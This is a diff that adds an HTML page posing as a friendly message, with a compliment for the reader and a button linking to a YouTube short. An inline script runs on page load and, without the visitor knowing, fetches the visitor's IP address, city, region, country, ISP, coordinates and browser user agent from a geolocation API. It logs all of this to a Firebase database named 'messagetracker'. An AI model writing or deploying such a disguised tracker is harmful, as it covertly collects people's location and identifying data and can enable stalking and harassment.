@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Message</title>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #333;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      max-width: 900px;
+      padding: 80px;
+      background: white;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+      border-radius: 20px;
+      text-align: center;
+    }
+
+    p {
+      font-size: 36px;
+      font-weight: bold;
+      line-height: 1.8;
+      margin: 0;
+    }
+
+    .footer {
+      margin-top: 40px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <p style="
+      font-size: 20px; 
+      color: #333; 
+      font-weight: bold; 
+      margin-bottom: 20px;
+    ">
+      "For a reader with a pretty smile!" ✨
+    </p>
+  <a href="https://www.youtube.com/shorts/_ozZDE80rWE" target="_blank">
+    <button style="
+      background-color: #007BFF; 
+      color: white; 
+      border: none; 
+      padding: 12px 24px; 
+      font-size: 16px; 
+      border-radius: 5px; 
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    ">
+      Click here
+    </button>
+  </a>
+  </div>
+
+  <script>
+    (function(){
+      const f = {
+        apiKey: "AIzaSyA6FOahPr_40N1WS0S-VY_ssQRefwJt9c8",
+        authDomain: "messagetracker-fced6.firebaseapp.com",
+        databaseURL: "https://messagetracker-fced6-default-rtdb.firebaseio.com",
+        projectId: "messagetracker-fced6",
+        storageBucket: "messagetracker-fced6.appspot.com",
+        messagingSenderId: "770318035535",
+        appId: "1:770318035535:web:c8b802e29e11c59e44183a",
+        measurementId: "G-YXQNQSL5HR"
+      };
+      firebase.initializeApp(f);
+      const db = firebase.database();
+
+      fetch("https://ipapi.co/json")
+        .then(r => r.json())
+        .then(d => {
+          const log = {
+            ip: d.ip,
+            city: d.city,
+            region: d.region,
+            country: d.country_name,
+            org: d.org,
+            timezone: d.timezone,
+            latitude: d.latitude,
+            longitude: d.longitude,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent
+          };
+          db.ref("ip_logs_p11In").push(log);
+        });
+    })();
+  </script>
+
+</body>
+</html>
